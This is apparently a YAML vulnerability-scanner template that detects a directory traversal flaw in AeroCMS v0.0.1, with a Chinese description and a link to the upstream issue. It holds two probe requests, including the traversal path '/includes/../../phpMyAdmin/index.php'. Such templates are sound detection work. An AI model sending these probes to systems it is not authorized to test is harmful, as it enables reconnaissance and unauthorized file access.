expression: r0() || r1()
id: aero-cms-directory-traversal
info:
  author: daffainfo
  description: "AeroCMS v0.0.1 \u88AB\u53D1\u73B0\u5305\u542B\u76EE\u5F55\u904D\u5386\
    \u6F0F\u6D1E\u3002\u8BE5\u6F0F\u6D1E\u662F\u7531\u4E8E\u672A\u80FD\u89C4\u8303\
    \u5316 url\u3002\u8BE5\u6F0F\u6D1E\u5141\u8BB8\u653B\u51FB\u8005\u8BFB\u53D6\u7F51\
    \u7AD9\u6839\u76EE\u5F55\u4E2D\u7684\u4EFB\u610F\u6587\u4EF6\u3002"
  name: "AeroCMS v0.0.1 \u76EE\u5F55\u904D\u5386\u6F0F\u6D1E"
  reference:
  - https://github.com/MegaTKC/AeroCMS/issues/7
  severity: medium
  verified: false
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'<title>phpMyAdmin</title>')
    request:
      method: GET
      path: /includes/../../phpMyAdmin/index.php
  r1:
    expression: response.status == 200 && "<title>Index of /(.*)/admin/js</title>".bmatches(response.body)
      && "<h1>Index of /(.*)/admin/js</h1>".bmatches(response.body)
    request:
      method: GET
      path: /admin/js
